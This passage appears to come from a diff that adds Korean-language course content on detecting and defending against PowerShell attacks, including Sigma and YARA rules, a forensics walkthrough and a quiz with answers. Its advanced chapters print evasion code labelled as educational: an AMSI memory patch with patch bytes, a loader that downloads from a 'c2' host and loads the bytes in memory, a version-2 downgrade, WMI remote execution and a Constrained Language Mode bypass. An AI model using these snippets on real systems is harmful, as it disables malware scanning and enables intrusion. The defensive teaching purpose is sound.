+              "type": "concept",
+              "heading": "다층 탐지 파이프라인",
+              "emojis": "🏗️",
+              "content": "효과적인 PowerShell 공격 탐지를 위해서는 단일 규칙이 아닌 다층 탐지 파이프라인이 필요합니다: 1단계 — 로그 수집 (Script Block Logging + Module Logging + Process Creation). 2단계 — 패턴 매칭 (Sigma 규칙으로 알려진 공격 패턴 탐지). 3단계 — 이상 탐지 (비정상적 PowerShell 실행 컨텍스트 감지). 4단계 — 상관 분석 (여러 이벤트를 조합하여 공격 체인 식별)."
+            },
+            {
+              "type": "diagram",
+              "heading": "PowerShell 공격 탐지 파이프라인",
+              "ascii": "  ┌─────────── 1. 로그 수집 ──────────────┐\n  │ Script Block │ Module  │ Process │ ETW │\n  │ (EID 4104)  │(EID 4103)│(EID 4688)│     │\n  ├──────────────────────────────────────┤\n  │          2. Sigma 규칙 매칭           │\n  │ Encoded Cmd │ Download │ Bypass   │    │\n  │  Detection  │ Cradle   │ Attempt  │    │\n  ├──────────────────────────────────────┤\n  │          3. 이상 탐지 (Anomaly)       │\n  │ 비정상 부모 │ 비정상   │ 새벽시간 │    │\n  │ 프로세스    │ 사용자   │ 실행     │    │\n  ├──────────────────────────────────────┤\n  │          4. SOAR 자동 대응            │\n  │ 알림 전송  │ 시스템   │ 포렌식   │    │\n  │            │ 격리     │ 수집     │    │\n  └──────────────────────────────────────┘"
+            }
+          ]
+        }
+      ],
+      "miniLabs": [
+        {
+          "type": "matching_game",
+          "title": "우회 기법과 대응 방법 매칭",
+          "description": "각 PowerShell 우회 기법에 대한 올바른 대응 방법을 선택하세요.",
+          "pairs": [
+            { "left": "-ExecutionPolicy Bypass로 실행 정책 우회", "right": "실행 정책 대신 CLM/AppLocker 사용" },
+            { "left": "-EncodedCommand로 명령 난독화", "right": "Script Block Logging (자동 디코딩)" },
+            { "left": "IEX + DownloadString 다운로드 크레이들", "right": "Sigma 규칙으로 패턴 탐지" },
+            { "left": "문자열 연결/역따옴표 난독화", "right": "Event ID 4104 난독화 자동 해제" },
+            { "left": ".NET 리플렉션 메모리 로딩", "right": "Constrained Language Mode 적용" }
+          ]
+        },
+        {
+          "type": "step_click",
+          "title": "PowerShell 포렌식 조사 절차",
+          "description": "악성 PowerShell 활동이 탐지되었을 때의 포렌식 조사 과정을 단계별로 따라가 보세요.",
+          "steps": [
+            { "emoji": "🚨", "label": "SIEM 알림 수신", "detail": "Sigma 규칙이 의심스러운 PowerShell 실행을 탐지합니다. Event ID 4104에서 Base64 인코딩된 명령 또는 다운로드 크레이들 패턴이 감지되었습니다." },
+            { "emoji": "🔍", "label": "Script Block 로그 분석", "detail": "Event ID 4104에서 난독화가 해제된 원본 스크립트를 확인합니다. IEX, DownloadString, Reflection 등의 키워드를 검색합니다." },
+            { "emoji": "🔗", "label": "프로세스 트리 추적", "detail": "Event ID 4688으로 powershell.exe의 부모 프로세스를 확인합니다. winword.exe → cmd.exe → powershell.exe 체인이면 매크로 기반 공격 의심." },
+            { "emoji": "🌐", "label": "네트워크 연결 확인", "detail": "Sysmon Event ID 3으로 PowerShell 프로세스의 외부 연결을 확인합니다. C2 서버 IP/도메인을 식별하고 추가 IoC를 추출합니다." },
+            { "emoji": "📊", "label": "타임라인 재구성", "detail": "모든 관련 이벤트를 시간순으로 정렬하여 공격 타임라인을 재구성합니다. 초기 실행 → 페이로드 다운로드 → 내부 정찰 → 횡단이동 순서를 파악합니다." },
+            { "emoji": "🛡️", "label": "억제 및 복구", "detail": "탐지된 C2 도메인/IP를 방화벽에서 차단하고, 감염 시스템을 격리합니다. 관련 자격증명을 리셋하고 추가 감염 여부를 점검합니다." }
+          ]
+        },
+        {
+          "type": "code_fill",
+          "title": "인코딩된 명령 탐지 Sigma 규칙 빈칸 채우기",
+          "description": "인코딩된 PowerShell 명령을 탐지하는 Sigma 규칙의 빈칸을 올바른 값으로 채우세요.",
+          "code": {
+            "filename": "sigma_encoded_fill.yml",
+            "language": "yaml",
+            "lines": [
+              { "text": "title: Encoded PowerShell Command Detection", "color": "green" },
+              { "text": "status: production", "color": "cyan" },
+              { "text": "level: high", "color": "red" },
+              { "text": "", "color": "white" },
+              { "text": "logsource:", "color": "yellow" },
+              { "text": "  category: ___blank1___", "color": "cyan" },
+              { "text": "  product: windows", "color": "cyan" },
+              { "text": "", "color": "white" },
+              { "text": "detection:", "color": "yellow" },
+              { "text": "  selection:", "color": "orange" },
+              { "text": "    Image|endswith: '\\___blank2___'", "color": "cyan" },
+              { "text": "    CommandLine|contains: '___blank3___'", "color": "cyan" },
+              { "text": "  condition: selection", "color": "yellow" }
+            ]
+          },
+          "blanks": [
+            { "id": "blank1", "answer": "process_creation", "hint": "프로세스 생성 이벤트 카테고리", "alternatives": ["ProcessCreation"] },
+            { "id": "blank2", "answer": "powershell.exe", "hint": "PowerShell 실행 파일명", "alternatives": ["pwsh.exe"] },
+            { "id": "blank3", "answer": "-EncodedCommand", "hint": "인코딩된 명령 실행 옵션", "alternatives": ["-enc", "-ec"] }
+          ]
+        }
+      ],
+      "quiz": {
+        "questions": [
+          {
+            "question": "PowerShell 실행 정책(Execution Policy)이 보안 경계가 아닌 이유는?",
+            "options": [
+              "암호화를 사용하지 않기 때문",
+              "최소 15가지 이상의 우회 방법이 존재하며 Microsoft도 보안 기능이 아니라고 명시",
+              "관리자만 변경할 수 있기 때문",
+              "PowerShell 7에서 제거되었기 때문"
+            ],
+            "correct": 1,
+            "explanation": "Microsoft 공식 문서에서 실행 정책을 '보안 기능이 아닌 사용자 편의 기능'으로 정의합니다. -ExecutionPolicy Bypass 플래그, 파이프라인 입력, 레지스트리 변경 등 최소 15가지 우회 방법이 존재합니다."
+          },
+          {
+            "question": "Script Block Logging(Event ID 4104)의 가장 큰 장점은?",
+            "options": [
+              "실행 속도가 빠름",
+              "난독화된 코드를 자동으로 해제하여 원본 코드를 기록",
+              "네트워크 트래픽도 함께 기록",
+              "악성 스크립트를 자동으로 차단"
+            ],
+            "correct": 1,
+            "explanation": "Script Block Logging은 PowerShell 엔진이 실제로 실행하는 코드를 기록합니다. 문자열 연결, Base64 디코딩 등 난독화가 해제된 최종 코드가 기록되므로, 공격자의 난독화 시도를 무력화합니다."
+          },
+          {
+            "question": "다운로드 크레이들(Download Cradle)의 핵심 위험은?",
+            "options": [
+              "대역폭을 많이 소비함",
+              "원격 코드를 디스크에 저장하지 않고 메모리에서 직접 실행 (Fileless)",
+              "시스템을 재부팅시킴",
+              "방화벽을 비활성화함"
+            ],
+            "correct": 1,
+            "explanation": "다운로드 크레이들은 Net.WebClient.DownloadString() 등으로 원격 코드를 받아 IEX로 즉시 실행합니다. 디스크에 파일을 남기지 않으므로 기존 파일 기반 안티바이러스가 탐지하기 어렵습니다."
+          },
+          {
+            "question": "Constrained Language Mode(CLM)가 차단하는 핵심 기능은?",
+            "options": [
+              "Get-Process, Get-Service 등 기본 Cmdlet",
+              ".NET 리플렉션, Add-Type, COM 객체 생성 등 고급 기능",
+              "파일 읽기/쓰기",
+              "네트워크 연결"
+            ],
+            "correct": 1,
+            "explanation": "CLM은 .NET 리플렉션(메모리 로딩), Add-Type(C# 컴파일), COM 객체 생성 등 공격에 악용되는 고급 기능을 차단합니다. 기본 Cmdlet은 정상 동작하므로 관리 업무에 큰 지장이 없습니다."
+          },
+          {
+            "question": "PowerShell 공격에서 -NoProfile(-nop) 옵션이 사용되는 이유는?",
+            "options": [
+              "실행 속도를 높이기 위해",
+              "프로필 스크립트 로딩을 건너뛰어 흔적을 줄이고 일관된 실행 환경을 확보하기 위해",
+              "관리자 권한을 얻기 위해",
+              "GUI를 비활성화하기 위해"
+            ],
+            "correct": 1,
+            "explanation": "-NoProfile 옵션은 사용자 프로필 스크립트(profile.ps1) 실행을 건너뜁니다. 이를 통해 프로필에 포함된 보안 설정이나 로깅 코드를 우회하고, 어떤 시스템에서든 동일한 실행 환경을 확보합니다."
+          },
+          {
+            "question": "다음 Sigma 규칙 조건에서 탐지되는 것은?\nImage|endswith: '\\powershell.exe'\nCommandLine|contains: 'Net.WebClient'",
+            "options": [
+              "PowerShell을 이용한 서비스 관리",
+              "PowerShell을 이용한 웹 요청/다운로드 시도",
+              "PowerShell의 Get-Help 명령 실행",
+              "PowerShell ISE 실행"
+            ],
+            "correct": 1,
+            "explanation": "이 Sigma 규칙은 powershell.exe가 실행되면서 명령줄에 Net.WebClient가 포함된 경우를 탐지합니다. 이는 다운로드 크레이들의 전형적 패턴으로, 원격 서버에서 코드를 다운로드하려는 시도를 나타냅니다."
+          },
+          {
+            "question": "PowerShell 난독화 기법 중 역따옴표(Backtick)를 사용하는 예시는?",
+            "options": [
+              "Invoke-Expression → IEX",
+              "Invoke-Expression → In`vo`ke-Ex`pre`ssion",
+              "Invoke-Expression → [Convert]::FromBase64String(...)",
+              "Invoke-Expression → $env:ComSpec"
+            ],
+            "correct": 1,
+            "explanation": "PowerShell의 역따옴표(`)는 이스케이프 문자이지만 일반 알파벳 앞에서는 무시됩니다. In`vo`ke-Ex`pre`ssion은 Invoke-Expression과 동일하게 동작하지만, 문자열 패턴 매칭 기반 탐지를 우회할 수 있습니다."
+          },
+          {
+            "question": "Module Logging(Event ID 4103)과 Script Block Logging(Event ID 4104)의 차이는?",
+            "options": [
+              "4103은 커널 레벨, 4104는 사용자 레벨 로그",
+              "4103은 Cmdlet 실행과 파이프라인을 기록, 4104는 실행된 스크립트 코드 전문을 기록",
+              "4103은 PowerShell 7 전용, 4104는 PowerShell 5 전용",
+              "4103은 자동 활성화, 4104는 수동 활성화"
+            ],
+            "correct": 1,
+            "explanation": "Event ID 4103(Module Logging)은 Cmdlet 호출과 파이프라인 입출력을 기록합니다. Event ID 4104(Script Block Logging)는 실행되는 PowerShell 코드 블록 자체를 기록하며, 난독화를 자동으로 해제한 원본 코드를 제공합니다."
+          }
+        ]
+      }
+    },
+    "advanced": {
+      "title": "PowerShell 심화: 고급 우회와 엔터프라이즈 방어",
+      "titleEn": "Advanced PowerShell: Evasion Techniques & Enterprise Defense",
+      "estimatedMinutes": 40,
+      "overviewPanel": {
+        "emoji": "🔥",
+        "question": "AMSI를 우회하고 메모리에서 실행되는 공격을 탐지할 수 있나요?",
+        "explanation": "고급 과정에서는 AMSI 내부 구조와 패치 기반 우회, .NET 리플렉션 로딩의 심층 분석, PowerShell 다운그레이드 공격, WMI 연계 원격 실행, Constrained Language Mode 우회, 포렌식 아티팩트 분석, YARA 규칙 작성, 엔터프라이즈 방어 아키텍처를 학습합니다.",
+        "learningGoals": [
+          { "emoji": "🔬", "title": "AMSI 내부 구조 분석", "desc": "AmsiScanBuffer 패치와 리플렉션 기반 우회의 코드를 심층 분석합니다" },
+          { "emoji": "🛡️", "title": "고급 탐지 기법", "desc": "YARA 규칙과 포렌식 아티팩트로 고급 PowerShell 공격을 탐지합니다" },
+          { "emoji": "🏰", "title": "엔터프라이즈 방어 아키텍처", "desc": "JEA, PowerShell v7 보안, 다층 방어 전략을 수립합니다" }
+        ]
+      },
+      "chapters": [
+        {
+          "id": "ch1",
+          "title": "AMSI 내부 구조와 우회 기법",
+          "panels": [
+            {
+              "type": "concept",
+              "heading": "AMSI(Antimalware Scan Interface)란?",
+              "emojis": "🛡️",
+              "content": "AMSI는 Windows 10에서 도입된 보안 인터페이스로, 스크립트 엔진(PowerShell, VBScript, JScript)에서 실행되는 코드를 안티맬웨어 솔루션에 전달하여 실시간 검사합니다. PowerShell은 Script Block을 실행하기 전에 AMSI에 전달하므로, 난독화가 해제된 원본 코드가 검사됩니다. amsi.dll이 PowerShell 프로세스에 로딩되어 AmsiScanBuffer() 함수가 호출됩니다."
+            },
+            {
+              "type": "diagram",
+              "heading": "AMSI 검사 흐름",
+              "ascii": "  [PowerShell 스크립트 실행]\n          │\n          ▼\n  [난독화 해제 (디코딩)]\n          │\n          ▼\n  [AmsiScanBuffer() 호출]─── amsi.dll\n          │\n          ▼\n  [안티맬웨어 엔진 검사]─── Windows Defender\n          │                     etc.\n     ┌────┴────┐\n     │         │\n  [정상]    [악성]\n     │         │\n  [실행]    [차단]\n              │\n       AMSI_RESULT_DETECTED"
+            },
+            {
+              "type": "code",
+              "heading": "AMSI 우회: AmsiScanBuffer 패치 (분석용)",
+              "filename": "amsi_bypass_analysis.ps1",
+              "language": "powershell",
+              "warning": "AMSI 우회 기법 분석 — 교육 목적, 실제 환경에서 사용 금지",
+              "lines": [
+                { "text": "# AMSI 우회 원리 분석 (의사 코드)", "color": "slate" },
+                { "text": "# 공격자는 amsi.dll의 AmsiScanBuffer 함수를 패치하여", "color": "slate" },
+                { "text": "# 항상 AMSI_RESULT_CLEAN을 반환하도록 변조합니다", "color": "slate" },
+                { "text": "", "color": "white" },
+                { "text": "# 1단계: amsi.dll에서 AmsiScanBuffer 주소 획득", "color": "green" },
+                { "text": "$amsi = [Runtime.InteropServices.Marshal]", "color": "cyan" },
+                { "text": "$addr = $amsi::GetProcAddress(", "color": "cyan" },
+                { "text": "    [Win32]::LoadLibrary('amsi.dll'),", "color": "yellow" },
+                { "text": "    'AmsiScanBuffer'", "color": "orange" },
+                { "text": ")", "color": "cyan" },
+                { "text": "", "color": "white" },
+                { "text": "# 2단계: 메모리 보호 변경 (RW → RWX)", "color": "green" },
+                { "text": "[Win32]::VirtualProtect($addr, [uint32]6, 0x40, [ref]$oldProtect)", "color": "red" },
+                { "text": "", "color": "white" },
+                { "text": "# 3단계: 함수 첫 바이트를 패치 (항상 성공 반환)", "color": "green" },
+                { "text": "# 원본: mov edi, edi / push ebp ...", "color": "slate" },
+                { "text": "# 패치: xor eax, eax / ret (0 반환 = CLEAN)", "color": "red" },
+                { "text": "$patch = [byte[]](0x31, 0xC0, 0x05, 0x78, 0x01, 0xC3)", "color": "red" },
+                { "text": "[Marshal]::Copy($patch, 0, $addr, $patch.Length)", "color": "red" }
+              ]
+            },
+            {
+              "type": "concept",
+              "heading": "리플렉션 기반 AMSI 우회",
+              "emojis": "🪞",
+              "content": "P/Invoke 없이 .NET 리플렉션만으로 AMSI를 비활성화하는 기법도 있습니다. System.Management.Automation.AmsiUtils 클래스의 내부 필드(amsiInitFailed)를 리플렉션으로 true로 설정하면, PowerShell이 AMSI 초기화에 실패한 것으로 판단하여 이후 모든 AMSI 검사를 건너뜁니다. 이 기법은 메모리 패치 없이 동작하므로 일부 탐지를 우회합니다."
+            }
+          ]
+        },
+        {
+          "id": "ch2",
+          "title": ".NET Assembly 리플렉션 로딩",
+          "panels": [
+            {
+              "type": "concept",
+              "heading": "메모리 내 .NET 어셈블리 실행",
+              "emojis": "🧬",
+              "content": "System.Reflection.Assembly::Load()는 바이트 배열에서 직접 .NET 어셈블리를 로딩합니다. 공격자는 이 API를 이용하여 C#으로 작성된 공격 도구(Rubeus, Seatbelt, SharpHound 등)를 디스크에 저장하지 않고 PowerShell에서 직접 실행합니다. 바이트 배열은 Base64 인코딩 또는 원격 다운로드로 전달됩니다."
+            },
+            {
+              "type": "code",
+              "heading": "리플렉션 로딩 패턴 분석",
+              "filename": "reflection_loading.ps1",
+              "language": "powershell",
+              "warning": "Fileless 실행 기법 분석 — 교육 목적",
+              "lines": [
+                { "text": "# 패턴 1: 원격 다운로드 + 리플렉션 로딩", "color": "slate" },
+                { "text": "$bytes = (New-Object Net.WebClient).DownloadData('http://c2/tool.exe')", "color": "red" },
+                { "text": "$asm = [System.Reflection.Assembly]::Load($bytes)", "color": "red" },
+                { "text": "$asm.EntryPoint.Invoke($null, @(,[string[]]@('arg1','arg2')))", "color": "orange" },
+                { "text": "", "color": "white" },
+                { "text": "# 패턴 2: Base64 인코딩된 어셈블리", "color": "slate" },
+                { "text": "$b64 = 'TVqQAAMAAAAEAAAA...'  # PE 바이너리의 Base64", "color": "yellow" },
+                { "text": "$bytes = [Convert]::FromBase64String($b64)", "color": "cyan" },
+                { "text": "[Reflection.Assembly]::Load($bytes).EntryPoint.Invoke($null, $null)", "color": "red" },
+                { "text": "", "color": "white" },
+                { "text": "# 패턴 3: GZip 압축 + Base64 (탐지 우회)", "color": "slate" },
+                { "text": "$stream = New-Object IO.MemoryStream(,[Convert]::FromBase64String($compressed))", "color": "cyan" },
+                { "text": "$gz = New-Object IO.Compression.GZipStream($stream, [IO.Compression.CompressionMode]::Decompress)", "color": "cyan" },
+                { "text": "$reader = New-Object IO.StreamReader($gz)", "color": "cyan" },
+                { "text": "[Reflection.Assembly]::Load([byte[]]$decompressed)", "color": "red" }
+              ]
+            }
+          ]
+        },
+        {
+          "id": "ch3",
+          "title": "PowerShell 다운그레이드 공격",
+          "panels": [
+            {
+              "type": "concept",
+              "heading": "PowerShell v2.0 다운그레이드란?",
+              "emojis": "⬇️",
+              "content": "PowerShell v2.0은 AMSI, Script Block Logging, Constrained Language Mode 등 최신 보안 기능이 없는 레거시 버전입니다. Windows 10에도 .NET Framework 2.0이 설치되어 있으면 powershell.exe -Version 2 명령으로 v2.0 엔진을 강제 실행할 수 있습니다. 이를 통해 모든 최신 보안 기능을 우회하는 것이 다운그레이드 공격입니다."
+            },
+            {
+              "type": "code",
+              "heading": "다운그레이드 공격과 탐지",
+              "filename": "downgrade_attack.ps1",
+              "language": "powershell",
+              "warning": "우회 기법 분석 — 교육 목적",
+              "lines": [
+                { "text": "# 공격: PowerShell v2.0으로 다운그레이드", "color": "red" },
+                { "text": "powershell.exe -Version 2 -Command \"IEX(...)\"", "color": "red" },
+                { "text": "", "color": "white" },
+                { "text": "# v2.0에서 우회되는 보안 기능:", "color": "slate" },
+                { "text": "#   - AMSI (Windows 10+에서 도입)", "color": "orange" },
+                { "text": "#   - Script Block Logging (PS 5.0+)", "color": "orange" },
+                { "text": "#   - Constrained Language Mode", "color": "orange" },
+                { "text": "#   - Module Logging 고급 기능", "color": "orange" },
+                { "text": "", "color": "white" },
+                { "text": "# 방어: .NET Framework 2.0 제거", "color": "green" },
+                { "text": "Disable-WindowsOptionalFeature -Online -FeatureName 'MicrosoftWindowsPowerShellV2Root'", "color": "green" },
+                { "text": "Disable-WindowsOptionalFeature -Online -FeatureName 'MicrosoftWindowsPowerShellV2'", "color": "green" },
+                { "text": "", "color": "white" },
+                { "text": "# 탐지: v2.0 엔진 시작 이벤트 모니터링", "color": "green" },
+                { "text": "# Event ID 400: EngineVersion=2.0 필터링", "color": "slate" },
+                { "text": "Get-WinEvent -LogName 'PowerShell' | Where-Object {", "color": "cyan" },
+                { "text": "    $_.Id -eq 400 -and $_.Message -match 'EngineVersion=2'", "color": "cyan" },
+                { "text": "}", "color": "cyan" }
+              ]
+            }
+          ]
+        },
+        {
+          "id": "ch4",
+          "title": "WMI/CIM 연계 공격",
+          "panels": [
+            {
+              "type": "concept",
+              "heading": "WMI를 통한 원격 PowerShell 실행",
+              "emojis": "🌐",
+              "content": "WMI(Windows Management Instrumentation)와 CIM(Common Information Model)은 원격 시스템 관리 프로토콜입니다. 공격자는 WMI의 Win32_Process.Create() 메서드를 통해 원격 시스템에서 PowerShell을 실행합니다. WinRM이 차단되어도 DCOM 기반 WMI로 대체할 수 있어, 횡단이동(Lateral Movement)에 자주 사용됩니다."
+            },
+            {
+              "type": "code",
+              "heading": "WMI 기반 원격 실행 패턴",
+              "filename": "wmi_remote_execution.ps1",
+              "language": "powershell",
+              "warning": "원격 실행 기법 분석 — 교육 목적",
+              "lines": [
+                { "text": "# WMI를 통한 원격 PowerShell 실행", "color": "slate" },
+                { "text": "Invoke-WmiMethod -Class Win32_Process -Name Create `", "color": "red" },
+                { "text": "    -ArgumentList 'powershell.exe -enc <BASE64>' `", "color": "red" },
+                { "text": "    -ComputerName TARGET_HOST `", "color": "yellow" },
+                { "text": "    -Credential $cred", "color": "yellow" },
+                { "text": "", "color": "white" },
+                { "text": "# CIM 세션을 통한 실행 (최신 방식)", "color": "slate" },
+                { "text": "$session = New-CimSession -ComputerName TARGET_HOST -Credential $cred", "color": "cyan" },
+                { "text": "Invoke-CimMethod -ClassName Win32_Process `", "color": "red" },
+                { "text": "    -MethodName Create `", "color": "red" },
+                { "text": "    -Arguments @{CommandLine='powershell.exe -nop -w hidden -enc ...'} `", "color": "orange" },
+                { "text": "    -CimSession $session", "color": "cyan" },
+                { "text": "", "color": "white" },
+                { "text": "# 탐지: Sysmon Event ID 1 (프로세스 생성)", "color": "green" },
+                { "text": "# ParentImage: wmiprvse.exe → 자식: powershell.exe", "color": "green" },
+                { "text": "# 이 부모-자식 관계는 WMI 원격 실행의 강력한 지표", "color": "green" }
+              ]
+            }
+          ]
+        },
+        {
+          "id": "ch5",
+          "title": "Constrained Language Mode 우회",
+          "panels": [
+            {
+              "type": "concept",
+              "heading": "CLM 우회 기법들",
+              "emojis": "🔓",
+              "content": "Constrained Language Mode는 강력하지만 완벽하지 않습니다. 알려진 우회 기법: ① PowerShell v2.0 다운그레이드 — v2.0에는 CLM이 없음. ② 사용자 정의 Runspace — C# 코드로 새 PowerShell Runspace를 FullLanguage로 생성. ③ AppLocker 규칙 허점 — 허용된 경로에서 스크립트 실행. ④ InstallUtil/MSBuild 등 우회 바이너리 — .NET 기본 도구를 통한 코드 실행. 방어자는 이러한 우회 경로를 모두 차단해야 합니다."
+            },
+            {
+              "type": "code",
+              "heading": "Runspace를 통한 CLM 우회 분석",
+              "filename": "clm_bypass_runspace.cs",
+              "language": "csharp",
+              "warning": "CLM 우회 분석 — 교육 목적, 방어 이해를 위해 제공",
+              "lines": [
+                { "text": "// C# 코드로 FullLanguage Runspace 생성 (CLM 우회)", "color": "slate" },
+                { "text": "using System.Management.Automation;", "color": "green" },
+                { "text": "using System.Management.Automation.Runspaces;", "color": "green" },
+                { "text": "", "color": "white" },
+                { "text": "// InitialSessionState에서 LanguageMode를 FullLanguage로 설정", "color": "slate" },
+                { "text": "var iss = InitialSessionState.CreateDefault();", "color": "cyan" },
+                { "text": "iss.LanguageMode = PSLanguageMode.FullLanguage;", "color": "red" },
+                { "text": "", "color": "white" },
+                { "text": "// 새 Runspace 생성 (CLM 우회)", "color": "slate" },
+                { "text": "using (var rs = RunspaceFactory.CreateRunspace(iss)) {", "color": "cyan" },
+                { "text": "    rs.Open();", "color": "cyan" },
+                { "text": "    using (var ps = PowerShell.Create()) {", "color": "cyan" },
+                { "text": "        ps.Runspace = rs;", "color": "cyan" },
+                { "text": "        ps.AddScript(\"[Reflection.Assembly]::Load(...)\");", "color": "red" },
+                { "text": "        ps.Invoke();  // FullLanguage에서 실행!", "color": "red" },
+                { "text": "    }", "color": "cyan" },
+                { "text": "}", "color": "cyan" }
+              ]
+            },
+            {
+              "type": "warning",
+              "heading": "방어: CLM 우회 경로 차단",
+              "content": "CLM 우회를 방어하려면: ① PowerShell v2.0을 완전히 제거. ② WDAC(Windows Defender Application Control)로 허용된 바이너리만 실행 가능하도록 제한. ③ InstallUtil, MSBuild 등 우회 가능한 .NET 도구의 실행을 제한. ④ ETW로 커널 레벨 모니터링 강화."
+            }
+          ]
+        },
+        {
+          "id": "ch6",
+          "title": "포렌식 아티팩트 분석",
+          "panels": [
+            {
+              "type": "concept",
+              "heading": "PowerShell 포렌식 핵심 아티팩트",
+              "emojis": "🔍",
+              "content": "PowerShell 공격의 포렌식 조사에서 확인해야 할 핵심 아티팩트: ① ConsoleHost_history.txt — PowerShell 명령 이력 파일 (PSReadLine). 위치: %APPDATA%\\Microsoft\\Windows\\PowerShell\\PSReadLine\\. ② Prefetch — powershell.exe 실행 기록 및 참조 파일 목록. ③ ETW Trace (.etl) — 커널 레벨 이벤트 추적 로그. ④ WMI Repository — 영구 WMI 이벤트 구독 확인 (지속성). ⑤ 레지스트리 — AMSI 프로바이더 등록 상태 확인."
+            },
+            {
+              "type": "comparison_table",
+              "heading": "포렌식 아티팩트와 분석 위치",
+              "headers": ["아티팩트", "경로/위치", "분석 내용"],
+              "rows": [
+                ["ConsoleHost_history.txt", "%APPDATA%\\...\\PSReadLine\\", "입력된 PowerShell 명령 이력"],
+                ["Prefetch", "C:\\Windows\\Prefetch\\POWERSHELL.EXE-*.pf", "실행 시간, 참조 DLL/파일 목록"],
+                ["Event Log (4104)", "PowerShell/Operational", "실행된 스크립트 블록 전문"],
+                ["Event Log (4688)", "Security", "프로세스 생성 명령줄"],
+                ["ETW Trace", ".etl 파일", "커널 레벨 이벤트 (AMSI, 스레드 등)"],
+                ["WMI Repository", "C:\\Windows\\System32\\wbem\\Repository\\", "영구 WMI 이벤트 구독 (지속성)"],
+                ["Transcription 로그", "GPO 설정 경로", "콘솔 입출력 전체 기록"]
+              ]
+            }
+          ]
+        },
+        {
+          "id": "ch7",
+          "title": "YARA 규칙으로 PowerShell 악성코드 탐지",
+          "panels": [
+            {
+              "type": "concept",
+              "heading": "YARA 기반 PowerShell 악성 스크립트 탐지",
+              "emojis": "🎯",
+              "content": "YARA 규칙은 파일 및 메모리에서 악성 패턴을 탐지합니다. PowerShell 악성 스크립트는 특유의 문자열 패턴(IEX, DownloadString, -enc, Reflection.Assembly 등)을 가지고 있어 YARA로 효과적으로 탐지할 수 있습니다. 디스크의 .ps1 파일뿐 아니라, 메모리 스캔이나 네트워크 트래픽에서도 적용 가능합니다."
+            },
+            {
+              "type": "code",
+              "heading": "PowerShell 악성 스크립트 탐지 YARA 규칙",
+              "filename": "detect_ps_malware.yar",
+              "language": "yara",
+              "lines": [
+                { "text": "rule PowerShell_Download_Cradle {", "color": "cyan" },
+                { "text": "    meta:", "color": "green" },
+                { "text": "        author = \"GOTROOT EDU\"", "color": "green" },
+                { "text": "        description = \"Detects PowerShell download cradle patterns\"", "color": "green" },
+                { "text": "        severity = \"high\"", "color": "red" },
+                { "text": "", "color": "white" },
+                { "text": "    strings:", "color": "yellow" },
+                { "text": "        $dl1 = \"DownloadString\" ascii wide nocase", "color": "orange" },
+                { "text": "        $dl2 = \"DownloadFile\" ascii wide nocase", "color": "orange" },
+                { "text": "        $dl3 = \"DownloadData\" ascii wide nocase", "color": "orange" },
+                { "text": "        $dl4 = \"Invoke-WebRequest\" ascii wide nocase", "color": "orange" },
+                { "text": "        $dl5 = \"Invoke-RestMethod\" ascii wide nocase", "color": "orange" },
+                { "text": "        $exec1 = \"IEX\" ascii wide", "color": "purple" },
+                { "text": "        $exec2 = \"Invoke-Expression\" ascii wide nocase", "color": "purple" },
+                { "text": "        $ref1 = \"Reflection.Assembly\" ascii wide", "color": "purple" },
+                { "text": "        $ref2 = \"::Load(\" ascii wide", "color": "purple" },
+                { "text": "        $enc1 = \"-EncodedCommand\" ascii wide nocase", "color": "purple" },
+                { "text": "        $enc2 = \"FromBase64String\" ascii wide nocase", "color": "purple" },
+                { "text": "", "color": "white" },
+                { "text": "    condition:", "color": "yellow" },
+                { "text": "        (1 of ($dl*) and 1 of ($exec*)) or", "color": "red" },
+                { "text": "        (1 of ($ref*) and 1 of ($dl*)) or", "color": "red" },
+                { "text": "        (1 of ($enc*) and 1 of ($dl*))", "color": "red" },
+                { "text": "}", "color": "cyan" }
+              ]
+            },
+            {
+              "type": "code",
+              "heading": "AMSI 우회 탐지 YARA 규칙",
+              "filename": "detect_amsi_bypass.yar",
+              "language": "yara",
+              "lines": [
+                { "text": "rule AMSI_Bypass_Attempt {", "color": "cyan" },
+                { "text": "    meta:", "color": "green" },
+                { "text": "        author = \"GOTROOT EDU\"", "color": "green" },
+                { "text": "        description = \"Detects AMSI bypass attempts\"", "color": "green" },
+                { "text": "        severity = \"critical\"", "color": "red" },
+                { "text": "", "color": "white" },
+                { "text": "    strings:", "color": "yellow" },
+                { "text": "        $s1 = \"AmsiScanBuffer\" ascii wide", "color": "orange" },
+                { "text": "        $s2 = \"AmsiUtils\" ascii wide", "color": "orange" },
+                { "text": "        $s3 = \"amsiInitFailed\" ascii wide", "color": "orange" },
+                { "text": "        $s4 = \"AmsiContext\" ascii wide", "color": "orange" },
+                { "text": "        $patch1 = { 31 C0 05 78 01 C3 }  // xor eax,eax; ret 패치", "color": "red" },
+                { "text": "        $api1 = \"VirtualProtect\" ascii wide", "color": "purple" },
+                { "text": "        $api2 = \"GetProcAddress\" ascii wide", "color": "purple" },
+                { "text": "", "color": "white" },
+                { "text": "    condition:", "color": "yellow" },
+                { "text": "        (2 of ($s*)) or ($patch1 and 1 of ($api*))", "color": "red" },
+                { "text": "}", "color": "cyan" }
+              ]
+            }
+          ]
+        },
+        {
+          "id": "ch8",
+          "title": "엔터프라이즈 방어 아키텍처",
+          "panels": [
+            {
+              "type": "concept",
+              "heading": "JEA (Just Enough Administration)",
+              "emojis": "🔐",
+              "content": "JEA는 PowerShell 원격 세션에서 사용 가능한 명령을 최소한으로 제한하는 기능입니다. 관리자가 특정 역할에 필요한 Cmdlet만 허용하는 '역할 기반 접근 제어'를 구현합니다. 예: DNS 관리자에게 DNS 관련 Cmdlet만 허용. 공격자가 원격 PowerShell 세션을 탈취하더라도 허용된 명령만 실행할 수 있어 피해를 최소화합니다."
+            },
+            {
+              "type": "concept",
+              "heading": "PowerShell v7 보안 강화",
+              "emojis": "🆕",
+              "content": "PowerShell v7(Core)은 v5.1 대비 다양한 보안 개선을 포함합니다: ① AMSI 통합 강화 — .NET Core 기반 AMSI 지원. ② SSH 기반 원격 통신 — WinRM 대안으로 SSH 프로토콜 지원. ③ 크로스 플랫폼 로깅 — Linux/macOS에서도 감사 로깅. ④ 제한된 Language Mode 개선 — 더 엄격한 타입 제한. 하지만 Windows에서 v5.1이 여전히 기본 설치되므로, 두 버전 모두 모니터링해야 합니다."
+            },
+            {
+              "type": "diagram",
+              "heading": "엔터프라이즈 PowerShell 방어 아키텍처",
